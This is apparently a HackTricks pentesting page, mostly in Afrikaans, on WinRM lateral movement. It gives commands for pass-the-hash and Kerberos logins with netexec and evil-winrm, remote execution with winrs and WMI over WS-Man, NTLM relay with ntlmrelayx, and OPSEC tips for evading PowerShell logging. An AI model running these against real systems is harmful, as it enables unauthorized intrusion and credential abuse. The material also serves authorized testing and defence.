# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM is een van die gerieflikste **lateral movement**-transporte in Windows-omgewings, omdat dit jou ’n remote shell oor **WS-Man/HTTP(S)** gee sonder om SMB service creation-truuks nodig te hê. As die teiken **5985/5986** blootstel en jou principal toegelaat is om remoting te gebruik, kan jy dikwels baie vinnig van "valid creds" na "interactive shell" beweeg.

Vir die **protocol/service enumeration**, listeners, enabling WinRM, `Invoke-Command`, en generic client usage, kyk:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Gebruik **HTTP/HTTPS** in plaas van SMB/RPC, so dit werk dikwels waar PsExec-style execution geblokkeer word.
- Met **Kerberos** vermy dit die stuur van reusable credentials na die teiken.
- Werk netjies vanaf **Windows**, **Linux**, en **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Die interactive PowerShell remoting path skep **`wsmprovhost.exe`** op die teiken onder die authenticated user context, wat operasioneel anders is as service-based exec.

## Access model and prerequisites

In die praktyk hang suksesvolle WinRM lateral movement van **drie** dinge af:

1. Die teiken het ’n **WinRM listener** (`5985`/`5986`) en firewall rules wat toegang toelaat.
2. Die account kan **authenticate** by die endpoint.
3. Die account mag ’n **remoting session** oopmaak.

Algemene maniere om daardie toegang te kry:

- **Local Administrator** op die teiken.
- Lidmaatskap in **Remote Management Users** op nuwer stelsels of **WinRMRemoteWMIUsers__** op stelsels/komponente wat nog daardie group eerbiedig.
- Expliciete remoting rights wat gedelegeer is deur local security descriptors / PowerShell remoting ACL changes.

As jy reeds ’n box met admin rights beheer, onthou jy kan ook **WinRM access deleger sonder full admin group membership** met die tegnieke hier beskryf:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos vereis ’n hostname/FQDN**. As jy per IP koppel, val die client gewoonlik terug na **NTLM/Negotiate**.
- In **workgroup**- of cross-trust edge cases vereis NTLM gewoonlik óf **HTTPS** óf dat die teiken by **TrustedHosts** op die client gevoeg word.
- Met **local accounts** oor Negotiate in ’n workgroup kan UAC remote restrictions toegang keer, tensy die ingeboude Administrator account gebruik word of `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting gebruik by verstek die **`HTTP/<host>` SPN**. In omgewings waar **`HTTP/<host>`** reeds aan ’n ander service account geregistreer is, kan WinRM Kerberos misluk met `0x80090322`; gebruik ’n port-qualified SPN of skakel oor na **`WSMAN/<host>`** waar daardie SPN bestaan.

As jy valid credentials tydens password spraying kry, is dit dikwels die vinnigste om dit oor WinRM te valideer om te sien of dit in ’n shell vertaal:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM vir interaktiewe shells

`evil-winrm` bly die gerieflikste interaktiewe opsie vanaf Linux omdat dit **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, lêeroordrag, en in-geheue PowerShell/.NET-laai ondersteun.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN randgeval: `HTTP` vs `WSMAN`

Wanneer die verstek **`HTTP/<host>`** SPN Kerberos-foute veroorsaak, probeer om eerder ’n **`WSMAN/<host>`** ticket aan te vra/gebruike. Dit kom voor in geharde of vreemde enterprise-opstellings waar `HTTP/<host>` reeds aan ’n ander diensrekening gekoppel is.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Dit is ook nuttig na **RBCD / S4U** misbruik wanneer jy spesifiek 'n **WSMAN** service ticket vervals of aangevra het eerder as 'n generiese `HTTP` ticket.

### Certificate-based authentication

WinRM ondersteun ook **client certificate authentication**, maar die certificate moet op die teiken gekarteer wees na 'n **local account**. Vanuit 'n offensive perspektief maak dit saak wanneer:

- jy reeds 'n geldige client certificate en private key gesteel/geëksporteer het wat reeds vir WinRM gekarteer is;
- jy **AD CS / Pass-the-Certificate** misbruik het om 'n certificate vir 'n principal te verkry en dan na 'n ander authentication path te pivot;
- jy in omgewings werk wat doelbewus password-based remoting vermy.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-sertifikaat WinRM is baie minder algemeen as password/hash/Kerberos auth, maar wanneer dit wel bestaan kan dit ’n **passwordless lateral movement**-pad bied wat password rotation oorleef.

### Python / automation with `pypsrp`

As jy outomatisering nodig het eerder as ’n operator shell, gee `pypsrp` jou WinRM/PSRP vanaf Python met **NTLM**, **certificate auth**, **Kerberos**, en **CredSSP** support.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM laterale beweging

### `winrs.exe`

`winrs.exe` is ingebou en nuttig wanneer jy **native WinRM command execution** wil hê sonder om ’n interaktiewe PowerShell remoting session oop te maak:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operasioneel lei `winrs.exe` gewoonlik tot ’n afgeleë prosesketting soortgelyk aan:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Dit is die moeite werd om te onthou omdat dit verskil van service-based exec en van interactive PSRP-sessies.

### `winrm.cmd` / WS-Man COM in plaas van PowerShell remoting

Jy kan ook uitvoer via **WinRM transport** doen sonder `Enter-PSSession` deur WMI-klasse oor WS-Man aan te roep. Dit hou die transport as WinRM, terwyl die remote execution-primitive **WMI `Win32_Process.Create`** word:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Daardie benadering is nuttig wanneer:

- PowerShell logging swaar gemonitor word.
- Jy **WinRM transport** wil hê maar nie ’n klassieke PS remoting-workflow nie.
- Jy custom tooling bou of gebruik rondom die **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Wanneer SMB relay geblokkeer word deur signing en LDAP relay beperk is, kan **WS-Man/WinRM** steeds ’n aantreklike relay target wees. Moderne `ntlmrelayx.py` sluit **WinRM relay servers** in en kan relay na **`wsman://`** of **`winrms://`** targets.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Twee praktiese notas:

- Relay is die nuttigste wanneer die teiken **NTLM** aanvaar en die gerelegeerde principal toegelaat word om WinRM te gebruik.
- Onlangse Impacket-kode hanteer spesifiek **`WSMANIDENTIFY: unauthenticated`** requests sodat **`Test-WSMan`**-styl probes nie die relay flow breek nie.

Vir multi-hop-beperkings nadat jy ’n eerste WinRM session geland het, kyk na:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC en detection notas

- **Interactive PowerShell remoting** skep gewoonlik **`wsmprovhost.exe`** op die teiken.
- **`winrs.exe`** skep gewoonlik **`winrshost.exe`** en dan die aangevraagde child process.
- Verwag **network logon** telemetry, WinRM service events, en PowerShell operational/script-block logging as jy PSRP gebruik eerder as rou **`cmd.exe`**.
- As jy net ’n enkele command nodig het, kan **`winrs.exe`** of eenmalige WinRM execution stiller wees as ’n langlewende interactive remoting session.
- As Kerberos beskikbaar is, verkies **FQDN + Kerberos** bo IP + NTLM om beide trust issues en ongemaklike client-side **`TrustedHosts`**-veranderings te verminder.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
